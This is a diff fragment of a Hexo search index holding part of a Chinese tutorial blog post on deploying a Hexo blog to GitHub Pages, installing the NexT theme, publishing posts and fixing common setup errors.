+<p>&emsp;&emsp;[11]、在原命令行窗口下，生成静态文件，输入：<span style="background-color: yellow;">hexo g</span></p>
+<p>&emsp;&emsp;[12]、上传到GitHub，输入：<span style="background-color: yellow;">hexo d</span></p>
+<p>&emsp;&emsp;如果你成功完成了上述十二步，现在是享受劳动成果的时候了，<span style="background-color: yellow;">https:&#x2F;&#x2F;账号名.github.io</span>，这就是专属于你的博客网址啦！&lt;(￣︶￣)&gt;</p>
+<h2><span id="5-使用更美观的主题可选">5、使用更美观的主题（可选）</span></h2><p>&emsp;&emsp;有点丑，至少我是这么想的。来选个好看的主题吧，博主这里推荐Next主体和Butterfly主体，博主会以自身博客为例，讲解下载、使用Next主题。</p>
+<p>&emsp;&emsp;[1]、打开GitHub，在搜索框搜索：<span style="background-color: yellow;">hexo next</span>，没错，这是GitHub大佬的杰作，点击“Code”，下载zip压缩包，解压到博客文件夹中的“theme”目录下</p>
+<p>&emsp;&emsp;[2]、在博客文件夹目录的<span style="background-color: orange;">_config.yml</span>文件修改配置theme：</p>
+<p>&emsp;&emsp;<code>theme: next</code></p>
+<p>&emsp;&emsp;可以先在本地运行一下博客看看有没有成功更换主题，没忘吧•⌄•(忘了就参考第三板块倒数第二句)</p>
+<p>&emsp;&emsp;[3]、当然，Next主体可更改的属性有很多，博主也还在学习怎么把博客变得更个性化，不过这不是有大佬嘛，推荐CSDN博主ywang_wnlo：<a href="https://blog.csdn.net/CoolBoySilverBullet/article/details/121719830?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226298D213-4C23-421C-88C8-99A1DE4019D6%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6298D213-4C23-421C-88C8-99A1DE4019D6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-1-121719830-null-null.nonecase&utm_term=hexonext&spm=1018.2226.3001.4450">【Hexo】NexT 主题的配置使用记录</a></p>
+<h2><span id="6-发表第一篇博客">6、发表第一篇博客</span></h2><p>&emsp;&emsp;来吧，发篇博客体验一下，打开你的Typora开始写文咯，这里我将讲述我新建文章的方法</p>
+<p>&emsp;&emsp;[1]、新建一个.md文件，在利用Typora完成编写后，将文件另存到：<span style="background-color: yellow;">hexo next博客文件夹&#x2F;source&#x2F;_posts&#x2F;</span></p>
+<p>&emsp;&emsp;[2]、在博客文件夹下通过cmd命令打开命令行窗口，依次输入以下三行代码，我简称为“三板斧”：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;通过上述三行代码，你的Hexo博客和GitHub仓库会被更新，写好的md文件也会挂在博客上</p>
+<p>&emsp;&emsp;<span style="background-color: red;">注</span>：在每次修改博客文件夹中内容后，都需运行一遍“三板斧”，才会在博客中生效</p>
+<h2><span id="7-可能出现的报错及解决方案">7、可能出现的报错及解决方案</span></h2><p>&emsp;&emsp;来说说我目前在建博客上碰到的壁，满满血泪史(Ｔ▽Ｔ)</p>
+<p>&emsp;&emsp;[1]、在使用npm包管理器下载<span style="background-color: yellow;">hexo-cli</span>时卡住，可尝试两种手段</p>
+<p>&emsp;&emsp;&emsp;①、修改npm源为阿里的镜像源，不使用国外服务器：</p>
+<p>&emsp;&emsp;&emsp;<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
+<p>&emsp;&emsp;&emsp;②、未下载依赖：<span style="background-color: yellow;">npm install</span></p>
+<p>&emsp;&emsp;随后重新进行<span style="background-color: yellow;">hexo-cli</span>下载，即重新进行3~[2]，若使用手段①，只需将命令开头的npm改为<span style="background-color: yellow;">cnpm</span></p>
+<p>&emsp;&emsp;[2]、检查自己创建的仓库是不是公开的，即“Public”，若不是，在该步骤会出现问题：4~[12]</p>
+<p>&emsp;&emsp;[3]、一定是根据4~[5]找到“Settings”，而不是在仓库的“Settings”中的“Deploy keys”中操作</p>
+<p>&emsp;&emsp;以下是在写文章时遇到的问题(っ╥╯﹏╰╥c)</p>
+<p>&emsp;&emsp;[4]、如果你想根据标题建立目录，不要使用Typora的一键目录，使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--toc--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;[5]、不知为何，当使用Markdown文件的高亮语法“&#x3D;&#x3D;高亮内容&#x3D;&#x3D;”时，Hexo上无法显示，这里可以直接使用HTML语法：</p>
+<p>&emsp;&emsp;<code>&lt;span style=&quot;background-color: yellow;&quot;&gt;高亮内容&lt;/span&gt;</code></p>
+<p>&emsp;&emsp;[6]、为了插入图片，我也同样撞了两次壁，查了百度，查了CSDN，找到成功方案，以下使用C++注释风格：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//在博客文件夹的_config.yml文件修改</span><br><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br><span class="line">//在博客文件夹下打开命令行窗口，安装新插件</span><br><span class="line">npm install hexo-asset-img --save</span><br><span class="line">//在/source/_posts/中建立一个同md文件相同名字的文件夹，将图片存放进去</span><br><span class="line">//插入图片的语法</span><br><span class="line">！[图片](图片路径/网络链接 &quot;Title&quot;) //路径可使用相对路径</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;看到这里，肯定有些人没有找到想要的解决方案，没关系，CSDN嘛，总会找到的，期待你的博客！</p>
+<p>&emsp;&emsp;╭（′▽‵）╭（′▽‵）╭（′▽‵）╯</p>
+]]></content>
   </entry>
 </search>
